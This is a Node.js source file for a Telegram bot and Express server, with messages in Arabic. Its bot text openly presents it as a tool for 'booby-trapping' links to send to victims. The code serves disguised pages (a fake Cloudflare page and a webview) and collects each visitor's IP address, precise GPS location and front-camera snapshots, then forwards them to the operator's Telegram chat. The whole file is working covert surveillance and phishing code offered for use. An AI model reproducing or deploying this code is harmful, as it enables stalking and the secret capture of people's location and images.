const fs = require("fs");
const express = require("express");
var bodyParser = require('body-parser');

const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="37.239.57.9 "




app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
} 
else{
res.redirect("https://t.me/O23_k");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
} 
else{
res.redirect("https://t.me/O23_k");
}

         
                              
});



bot.on('message', (msg) => {
const chatId = msg.chat.id;


if(msg?.reply_to_message?.text=="🦇 ارسل لي الرابط الذي سيتم تلغيمة"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, "مرحباً بك  ${msg.chat.first_name} ! , \nعن طريق هذا البوت يمكنك تلغيم رابط و ارسالة الى الضحية.\nو يمكنك سحب معلومات جهازة مثل user_agent و IP address و location مع اخذ لقطة من الكامرة الامامية للضحية.\n\nاكتب /help للمزيد من المعلومات.",m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId," من خلال هذا الروبوت يمكنك تتبع الأشخاص فقط عن طريق إرسال رابط بسيط.☠️\n\nارسل /create لينشأ 💀, وبعد ذلك سيطلب منك عنوان URL الذي سيتم ستخدامه في  ل خداع  الضحايا.🍷\nبعد الاستلام عنوان url سيرسل لك رابطين يمكنك استخدامهما لتتبع الأشخاص.🐊 \n\nالمميزات. \n1. رابط الوهمي: ستعرض هذه الطريقة صفحة التي ارسلتها لل روبوت تحت الهجوم لجمع المعلومات وبعد ذلك سيتم إعادة توجيه الضحية إلى عنوان URL المقصود الذي ارسلتة.🍷 \n2. رابط الوهمي: سيُظهر هذا موقع ويب (مثل bing ومواقع المواعدة وما إلى ذلك) يستخدم الرابط الوهمي لجمع المعلومات.( استعملة في الخير لا في الشر ) \n\nتم تطوير وتحديث هذا المشورع من قبل المبرمج @O23_k");
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
console.log(error.code); 
});





function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"أرسل الرابط الجديد",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;

bot.sendMessage(cid, "تم انشاء الروابط الملغمة والان هية جاهزة لاختراق الضحية.\nURL او الرابط: ${msg}\n\n💀Your Links\n\n🦇 CloudFlare Page Link\n${hostURL}/c/${url}\n\n💻 WebView Page Link\n${hostURL}/w/${url}",m);
 
}
else{
bot.sendMessage(cid,"⚠️ اعطني عنوان صالح او رابط صالح للتلغيم , including http or https.");
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🤠 أرسل الرابط الان`,mk);
}





app.get("/", (req, res) => {
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.send(ip);

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){
  bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("تم التلغيم 🥷");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("تم التلغيم 🥷");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');

var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("تم التلغيم 🥷");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
